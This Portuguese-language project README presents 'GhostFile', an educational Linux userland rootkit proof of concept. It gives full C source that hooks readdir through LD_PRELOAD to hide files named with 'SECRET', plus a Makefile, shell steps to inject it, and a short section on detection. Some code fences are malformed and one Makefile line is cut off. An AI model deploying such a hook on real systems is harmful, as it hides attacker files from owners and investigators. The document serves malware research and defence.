
# GhostFile: A Study on Userland Rootkits and Shared Library Injection

![Field](https://img.shields.io/badge/Field-Malware--Research-red)
![Purpose](https://img.shields.io/badge/Purpose-Educational-green)
![OS](https://img.shields.io/badge/OS-Linux-orange)

## 📌 Overview
**GhostFile** é uma Prova de Conceito (PoC) desenvolvida para explorar o **Sequestro de Vinculador Dinâmico** (Dynamic Linker Hijacking) em sistemas Linux. Este projeto demonstra como a variável de ambiente `LD_PRELOAD` pode ser explorada para interceptar funções da biblioteca padrão, permitindo a camuflagem de artefatos e a subversão da confiança no sistema operacional.

> ⚠️ **DISCLAIMER:** Este projeto foi criado estritamente para **FINS EDUCACIONAIS E DE PESQUISA**. O entendimento de técnicas ofensivas é fundamental para a construção de defesas resilientes, análise forense avançada e desenvolvimento de sistemas de detecção modernos.

---

## 🔬 Technical Deep Dive: LD_PRELOAD Hooking

A essência desta pesquisa envolve a interceptação de chamadas para a **GNU C Library (glibc)**. No Linux, o vinculador dinâmico (`ld.so`) verifica a variável `LD_PRELOAD`; se definida, ele carrega as bibliotecas compartilhadas especificadas antes de qualquer outra.

### The Hooking Mechanism
Neste laboratório, o alvo foi a função `readdir`, responsável por ler o conteúdo de diretórios. Ao criar um "wrapper" personalizado, o rootkit consegue:

1. **Interceptar**: Captura a requisição da aplicação (ex: `ls`) para listar arquivos.
2. **Ponte (Bridge)**: Utiliza `dlsym` com a flag `RTLD_NEXT` para localizar o endereço real da função `readdir`, garantindo que o sistema não trave.
3. **Filtrar**: Manipula os dados retornados ao usuário, ocultando nomes de arquivos que contenham termos específicos (como "SECRET").

---

## 💻 Source Code (`ghostfile.c`)

Este é o código em C que compõe a biblioteca do rootkit. Para utilizá-lo, salve este trecho em um arquivo chamado `ghostfile.c`:

``c
#define _GNU_SOURCE
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

/* Ponteiro para armazenar a função original */
static struct dirent *(*original_readdir)(DIR *dirp) = NULL;

struct dirent *readdir(DIR *dirp) {
    /* Carrega a função original se for a primeira vez */
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        /* Lógica de Evasão: Oculta arquivos que contenham "SECRET" no nome */
        if (strstr(entry->d_name, "SECRET") != NULL) {
            continue; 
        }
        return entry;
    }
    return NULL;
}```c

🛠️ Automação e Laboratório (Makefile)

Para compilar o projeto de forma profissional, utilize este arquivo Makefile:
Makefile

# Comandos de compilação
CC = gcc
CFLAGS = -Wall -fPIC -shared
LDFLAGS = -ldl
TARGET = ghostfile.so

all:
	$(CC) $(CFLAGS) -o $(TARGET) ghostfile.c $(LDFLAGS)

test: all
	touch SECRET_data_log.txt
	@echo "--- Sem Rootkit (Arquivo visível) ---"
	ls -la | grep SECRET
	@echo "--- Com Rootkit (Arquivo OCULTO) ---"
	LD_PRELOAD=./$(TARGET) ls -la | grep SECRET || echo "Sucesso: O arquivo foi

  🚀 Como Reproduzir (Manual)
  # 1. Compilar a biblioteca
gcc -Wall -fPIC -shared -o ghostfile.so ghostfile.c -ldl

# 2. Criar um arquivo para teste
touch SECRET_projeto_x.txt

# 3. Injetar a biblioteca na sessão
export LD_PRELOAD=$PWD/ghostfile.so

# 4. Verificar a evasão
ls -la # O arquivo sumirá da lista, apesar de ainda existir no disco
Detecção e Análise Forense

Como pesquisador, entender a detecção é tão importante quanto o ataque:

    Inspeção de Vinculador: Use ldd em utilitários suspeitos para verificar dependências inesperadas.
    Análise de Ambiente: Audite variáveis de ambiente em busca de entradas LD_PRELOAD.
    Mapeamento de Memória: Inspecione /proc/[PID]/maps para encontrar bibliotecas carregadas de caminhos não padronizados.
    Bypass Estático: O uso de binários estáticos ou chamadas de sistema (syscalls) via Assembly ignora a glibc. 

🏁 Conclusão

O projeto GhostFile demonstra que a segurança é uma corrida armamentista. Quando bibliotecas centrais são subvertidas, a "verdade" do sistema operacional é comprometida. Este estudo serve como base para minha especialização em Malware Research, conectando a segurança de aplicações com a exploração de baixo nível do Kernel.
Focado em Engenharia de Baixo Nível e Análise Binária. Acredito que, para defender um sistema, é preciso primeiro entender como subvertê-lo.

Conecte-se comigo:(linkedin:"https://www.linkedin.com/in/felipe-gomes-1536b8372/")


